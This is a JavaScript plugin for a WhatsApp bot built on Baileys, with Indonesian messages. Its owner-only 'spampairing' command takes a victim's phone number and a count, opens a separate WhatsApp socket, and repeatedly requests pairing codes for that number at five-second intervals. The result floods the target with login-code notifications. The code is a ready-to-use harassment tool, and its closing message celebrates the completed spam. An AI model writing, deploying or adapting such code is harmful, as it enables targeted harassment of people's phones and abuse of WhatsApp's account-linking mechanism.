require('../../settings');

module.exports = {
    name: 'spampairing',
    alias: ['spam-pairing'],
    description: '<nomor>|<jumlah>',
    run: async ({ naze, m }) => {
        try {
            
            const botNumber = await naze.decodeJid(naze.user.id);
            const isOwner = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);

            if (!isOwner) {
                
                return global.sendMessageWithThumbnail(naze, m.chat, 'owner', m);
            }

            

            const body = m.type === 'conversation' ? m.message.conversation :
                         m.type === 'imageMessage' ? m.message.imageMessage.caption :
                         m.type === 'videoMessage' ? m.message.videoMessage.caption :
                         m.type === 'extendedTextMessage' ? m.message.extendedTextMessage.text :
                         m.type === 'buttonsResponseMessage' ? m.message.buttonsResponseMessage.selectedButtonId :
                         m.type === 'listResponseMessage' ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
                         m.type === 'templateButtonReplyMessage' ? m.message.templateButtonReplyMessage.selectedId :
                         m.type === 'messageContextInfo' ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) :
                         m.type === 'editedMessage' ? (m.message.editedMessage.message.protocolMessage.editedMessage.extendedTextMessage?.text || m.message.editedMessage.message.protocolMessage.editedMessage.conversation) : '';
            const args = body.trim().split(/ +/).slice(1);
            const text = args.join(' ').trim();

            if (!text) {
                
                return naze.sendMessage(m.chat, { text: `*Format salah!* Gunakan perintah:\n\n\`${m.prefix}${m.command} <nomor>|<jumlah>\`\n> Contoh: \`${m.prefix}${m.command} +6281234567890|150\`` }, { quoted: m });
            }

            let [target, count = '200'] = text.split('|');
            target = target.replace(/[^0-9]/g, '').trim();
            const numCount = parseInt(count, 10);

            if (!target || isNaN(numCount) || numCount <= 0) {
                
                return naze.sendMessage(m.chat, { text: `*Format salah!* Gunakan perintah:\n\n\`${m.prefix}${m.command} <nomor>|<jumlah>\`\n> Contoh: \`${m.prefix}${m.command} +6281234567890|150\`` }, { quoted: m });
            }

            await naze.sendMessage(m.chat, { text: `⏳ *Sedang memproses...*\nMohon tunggu, bot akan mengirim kode pairing secara bertahap.` }, { quoted: m });

            const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('baileys');
            const { state } = await useMultiFileAuthState('pepek');
            const { version } = await fetchLatestBaileysVersion();
            const pino = require('pino');
            const socket = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });

            const sleep = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

            let sentCount = 0;
            for (let i = 0; i < numCount; i++) {
                await sleep(5000);
                await socket.requestPairingCode(target);
                sentCount++;
            }

            
            await naze.sendMessage(m.chat, { text: `🎉 *Selesai!*\nBot telah menyelesaikan spam pairing code untuk nomor ${target} sebanyak ${sentCount} kali.\n\n💡 *Tips: Gunakan fitur ini dengan bijak.*` }, { quoted: m });
            await sleep(15000);
        } catch (err) {
            
            await global.handleError(naze, m, err, { sendRawError: true, useGemini: true });
        }
    }
};